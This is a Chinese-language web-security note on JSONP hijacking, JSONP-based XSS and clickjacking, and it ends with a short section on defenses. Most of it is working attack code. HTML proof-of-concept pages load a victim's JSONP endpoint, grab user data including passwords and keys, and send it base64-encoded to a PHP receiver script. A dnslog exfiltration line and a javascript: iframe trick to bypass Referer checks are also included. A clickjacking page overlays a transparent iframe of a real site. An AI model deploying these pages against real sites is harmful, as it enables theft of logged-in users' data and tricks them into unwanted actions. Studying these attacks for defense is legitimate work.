
---
# JSONP
  
JSONP（JSON with Padding）是一种用于解决跨域数据请求的变通方案，其核心原理：

**利用`<script>`标签的跨域特性绕过同源策略**。

就是加载远程js文件绕过同源策略，传入的参数中有构成函数

<h2><center>漏洞原理-利用</center></h2>
在早期，前后端分离等技术还不成熟的时候，这种问题实际上是非常常见的。很多开发者的设计方法简单粗暴，一个简单的例子，一个A论坛，有一个返回用户信息的接口，开发者的设计理念是，用户在登录状态下访问网站，会调用这个接口，这是一个jsonp接口，返回的内容就是：

xxxxx({ username: "Sentim", password: "123456" })

我们只需要找出这个jsonp接口，然后按上述方法加工成jsonp.html，如果一个在A论坛处于登陆状态的用户不慎访问到了黑客在网站B部署的jsonp.html，那么我们就可以获取用户的敏感信息了

demo,   `http://test:8069/test.php`

```php
<?php

header('Content-type:application/json');

error_reporting(0);

session_start();

$callback=$_GET['callback'];

$name=$_GET['name'];//模拟admin的session

if($name=='admin'){

    echo $callback."({'id':1,'name':'Sentiment','pwd':'123456','key':'88888'})";

}

?>
```
假设用户在admin权限下访问`http://test:8069/test.php?callback=testme`
返回
testme({'id':1,'name':'Sentiment'})
可以把这些敏感数据外带

编写POC
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>poc</title>

    <!-- 使用$s需要加载js文件 -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

</head>

  
<body>

    <script>
        function testname(v) {
           alert("json hack");
            var h = '';
            for (var key in v) {
                var a = key + ':' + v[key] + ' ,';
                h += a;
            }
            alert(h);

            // 数据外带
            $.get('http://localhost:3000/js_xss/value.php?value=' + h);
            // $.post('http://127.0.0.1:8080/1.html', { value: h });

        }

    </script>

   <!-- 访问页面  -->
    <script src="http://127.0.0.1:3000/js_xss/test.php?callback=testname&name=admin"></script>

</body>

</html>
```

程序员在开发jsonp接口的时候，其开发习惯就是这样的，jsonp接口通过一个参数（一般参数名都是callback），这个参数接收到的数据就会作为函数名被拼接成

接收脚本poc
```php
<?php

$value = $_GET['value'];

// $value=preg_replace('/,/', "\n", $value);

if ($value) {
    // 打开文件并获取文件句柄

    $file = fopen('value.txt', 'w+');
    if ($file) {
       // 写入数据
        $value=base64_decode($value);
        fwrite($file, $value);

        // 关闭文件
        fclose($file);

    } else {

        // 处理文件打开失败的情况
        error_log("Failed to open file: value.txt");

    }

} else {

    // 处理没有传入 value 参数的情况
    error_log("No value parameter provided");

}
```

<h2><center>常用Payload</center></h2>
万能poc
```html
<!DOCTYPE html>

<html lang='en'>

<head>

    <meta name="referrer" content="never" charset="utf-8">

    <title>jsonp</title>
</head>

<body>

    <h1>万能poc</h1>

</body>

<script type="text/javascript">
   
    function testname(data) {  //这里的函数名要看返回内容是咋样的

        // dnsloag
        //new Image().src="http://jsonp.reiwgah.exeye.io/" + JSON.stringify(data)
  
        var hacker_data = JSON.stringify(data)
        document.write("<p>" + hacker_data + "</p>")
        alert(hacker_data)
        var xmlHttp;
        xmlHttp = new XMLHttpRequest();
        var url = "http://localhost:3000/js_xss/value.php?value=" + btoa(hacker_data);
        xmlHttp.open("GET", url, true);
        xmlHttp.send(null);
    }

</script>

<script src="http://127.0.0.1:3000/js_xss/test.php?callback=testname&name=admin"></script>
```

<h2><center>JSONP绕过</center></h2>
### 绕过Referer头部检测

a、有些检查Referer不严格的，只检查Referer中有自身域名字段（例如：assc.com），我们就可以构造http://attack.com/1.html?a=assc.com就可以直接绕过，与CSRF差不多

b、有时候开发允许Referer置空，毕竟不是访问任何站点都要带Referer。然后就是另外一种置空方式，利用`<iframe>`标签调用 javscript 伪协议来实现空 Referer 调用

```html
<!DOCTYPE html>

<html lang='en'>

<head>
    <title>jsonp 不带Referer</title>
</head>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<body>

    jsonp 不带Referer 劫持测试
    <iframe
        src="javascript:'<script>function testname(data){alert(JSON.stringify(data));}</script><script src=http://127.0.0.1:3000/js_xss/test.php?callback=testname&name=admin></script>'"
        frameborder="0">
    </iframe>
</body>

</html>
```

工具
https://github.com/yuebusao/jsonp-burp-killer

<h2><center>JSONP型xss</center></h2>
传入：?callback=hello的时候，页面上就会出现以hello开头的一串数据，这不就是吃什么吐什么吗？那么这里就可能造成XSS

条件：
当数据包的默认content-type为text/html时，那么这个点就会触发反射型XSS，值得一提的是，PHP默认content-type就是text/html，所以可以对PHP进一步关注

经测试后发现application/json、text/json、application/javascript、text/javascript等都不触发XSS

# 点击劫持漏洞

<h2><center>介绍-原理说明</center></h2>

点击劫持是一种非常简单的漏洞，它的意思就是说，我们跳转到某个页面，但是在这个页面上**覆盖了攻击者自定义的一个页面**（使用iframe加载原截面），受害者看到的页面是被覆盖后的页面，这个页面上有些可供点击的功能点。**受害人点击这些功能点的时候，殊不知实际上点击的是原来的页面上的某些点，因此当原界面上有些敏感操作的按钮的时候**（比如删除用户、新增用户、关注投币收藏等类似的功能），就会被触发。这就是点击劫持。

### payload
```html
<!DOCTYPE HTML>

<html>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<head>
    <title>点击劫持</title>
    <style>
        html,body,iframe {
            display: block;
            height: 100%;
            width: 100%;
            margin: 0;
            padding: 0;
            border: none;
        }
        iframe {
            opacity: 0.5;
            filter: alpha(opacity=0);
            position: absolute;
            z-index: 2;
        } 
        button {
            position: absolute;
            top: 450px;
            left: 850px;
            z-index: 1;
            width: 72px;
            height: 26px;
        }

    </style>
</head>

  
<body>
    万万想不到
    <button>查看详情</button>
    <iframe src="https://www.baidu.com/p/9536743109"></iframe>
</body>

  
</html>

<!--
//Iframe标签里填的地址是存在可能被点击劫持按钮的界面

 //opacity 意为透明度，可以先调高一点来调整按钮位置，确认无误之后再调低

 //button里的width和height可以调整按钮大小
 
 //button里的top 和 left可以调节按钮在页面中的位置

 -->
```


<h2><center>漏洞防范</center></h2>
要对抗这种经典的点击劫持漏洞非常简单，只需要确保我们的敏感页面不能被iframe加载就行，使用**X-Frame-Options**或者**CSP机制**都可以实现防御，这里我们在响应头里使用X-Frame-Options来防御

使用 X-Frame-Options 有三个可选的值：
```
DENY：浏览器拒绝当前页面加载任何iFrame页面  
SAMEORIGIN：iframe页面的地址只能为同源域名下的页面  
ALLOW-FROM：origin为允许iframe加载的页面地址
```

如下图，我们在响应头里添加X-Frame-Options: DENY去进行防御

![[wx.png]]
以此类推

此外还有一些防御方法，比如使用SameSite=Lax、SameSite=Strict去禁止跨站请求中发送Cookie，这样我们无法通过鉴权，不具备正常的用户身份，这样绝大多数敏感操作都没有意义了。